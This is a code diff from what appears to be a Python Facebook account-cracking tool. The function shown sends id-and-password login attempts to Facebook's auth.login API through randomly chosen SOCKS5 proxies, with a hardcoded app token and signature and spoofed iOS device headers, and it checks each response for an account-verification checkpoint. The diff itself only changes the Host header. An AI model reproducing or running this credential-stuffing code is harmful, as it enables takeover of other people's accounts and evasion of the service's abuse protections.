@@ -1570,7 +1570,7 @@ def b_api(idf, pwv):
             nip = random.choice(prox)
             proxs = {'http': 'socks5://' + nip}
             params = ({ "access_token": "237759909591655|25257C0f140aabedfb65ac27a739ed1a2263b1", "sdk_version": random.randint(1, 26), "email": idf, "locale": "en_US", "password": pw, "sdk": "ios", "generate_session_cookies": "1", "sig": "3f555f99fb61fcd7aa0c44f58f522ef6" })
-            headers = ({ "Host": url, "x-fb-sim-hni": str(random.randint(100000, 300000)), "x-fb-net-hni": str(random.randint(100000, 300000)), "x-fb-connection-quality": "EXCELLENT", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-device-group": f"{str(random.randint(1000, 4000))}", "x-fb-friendly-name": "RelayFBNetwork_GemstoneProfilePreloadableNonSelfViewQuery", "x-fb-request-analytics-tags": "unknown", "accept-encoding": "gzip, deflate", "x-fb-http-engine": "Liger", "connection": "close" })
+            headers = ({ "Host": "b-api.facebook.com", "x-fb-sim-hni": str(random.randint(100000, 300000)), "x-fb-net-hni": str(random.randint(100000, 300000)), "x-fb-connection-quality": "EXCELLENT", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-device-group": f"{str(random.randint(1000, 4000))}", "x-fb-friendly-name": "RelayFBNetwork_GemstoneProfilePreloadableNonSelfViewQuery", "x-fb-request-analytics-tags": "unknown", "accept-encoding": "gzip, deflate", "x-fb-http-engine": "Liger", "connection": "close" })
             post = ses.post(f"https://b-api.facebook.com/method/auth.login/", params=params, headers=headers, allow_redirects=False,proxies=proxs)
 
             if "User must verify their account" in post.text:
